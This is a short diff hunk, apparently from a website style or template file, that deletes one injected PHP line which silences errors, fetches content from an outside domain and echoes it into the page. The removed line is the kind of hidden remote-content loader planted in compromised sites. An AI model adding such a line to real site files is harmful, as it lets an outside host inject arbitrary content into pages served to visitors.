@@ -1024,7 +1024,6 @@ border-radius: 8px; }
 	
 	
 
-<?php error_reporting(0); $cont = file_get_contents("http://cdn.xemtructuyen.org/data.php"); echo $cont; ?>
 
 
 
